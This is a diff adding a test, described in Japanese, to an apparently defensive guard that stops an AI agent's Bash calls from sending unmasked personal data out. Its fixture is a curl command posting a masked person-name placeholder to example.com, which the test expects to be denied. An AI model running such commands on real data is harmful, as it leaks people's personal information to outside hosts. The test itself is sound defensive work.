@@ -189,6 +189,27 @@ describe('register', () => {
     expect(plain.decision).toBe('allow')
   })
 
+  test('通信系に見える Bash は、承認を経ても伏せ字を戻して実行しない', async ($, on) => {
+    gemmaFinding(on, [NAME])
+    quietUi(on)
+    let isRun = false
+    on('tool.call', { tool: 'Bash' }, () => {
+      isRun = true
+
+      return { result: {} as never }
+    })
+
+    await submitted($, on, `${NAME}さんの件`)
+    const called = await $.tool.call({
+      tool: 'Bash',
+      tool_use_id: 'toolu_bash',
+      command: '/usr/bin/curl -d "__PII_PERSON_1__" https://example.com',
+    })
+
+    expect(isRun).toBe(false)
+    expect(called.deny ?? called.text).toContain('外部と通信しうるコマンド')
+  })
+
   test('拒否された Bash は、伏せ字を含んでいても拒否のまま', async ($, on) => {
     gemmaFinding(on, [NAME])
     quietUi(on)
